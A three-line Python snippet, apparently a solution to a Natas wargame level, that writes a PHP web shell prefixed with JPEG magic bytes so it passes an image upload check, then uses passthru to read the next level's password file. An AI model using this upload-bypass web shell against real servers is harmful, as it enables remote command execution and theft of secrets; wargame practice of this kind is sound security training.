fh = open('webshell.php', 'w')
fh.write('\xFF\xD8\xFF\xE0' + '<? echo passthru("cat /etc/natas_webpass/natas14"); ?>')
fh.close()